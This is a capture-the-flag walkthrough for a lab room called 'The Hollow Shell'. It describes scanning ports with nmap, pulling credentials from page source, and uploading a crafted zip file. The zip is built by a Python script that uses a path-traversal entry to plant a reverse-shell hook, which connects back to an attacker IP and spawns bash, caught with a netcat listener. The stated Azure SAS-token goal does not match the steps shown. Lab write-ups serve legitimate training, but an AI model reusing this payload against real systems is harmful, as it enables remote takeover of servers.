<p align="center">
  <img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785251823751&w=96&q=75"> 
</p>

# The Hollow Shell

In this room, use the discovered sensitive information, such as the Azure Storage account name and SAS token, to access and explore the Blob Storage resources.


Target application:
```URL
https://MACHINE_IP
```

## STEP 01
- Open the web app
```URL
https://MACHINE_IP
```
output:
```
This site can't be reached
```
- Find which port is open and provides service
  ```
  nmap -p 1-6000 --open MACHINE_IP
  ```
  > usage:
  > - -p- : Scan all ports
  > - -p <startport>-<endport> : scan specific port range
  > - -p 5000 : Scan specific one port

- Then try
  ```
  http://MACHINE_IP:PORT 
  ```
- Then view the source code;
- You123 will find `username`  and `password`

## STEP 02
- Then create `reverse-shell.zip`
```Python
import json
import zipfile

RHOST="YOUR_iIP"
RPORT= PORT

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f'''
import os
import pty
import socket

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({RHOST!r}, {RPORT}))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("shell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(".../hooks/callback.py", callback)


print("Created reverse-shell.zip")
```

- Then upload it
- Then run `nc listener.`
  ```bash
  sudo nc -l 2000
  ```
- Check the File directory
  
## You will find the  **FLAGs** 🚩

# Congratulations on our Exploration 🎉
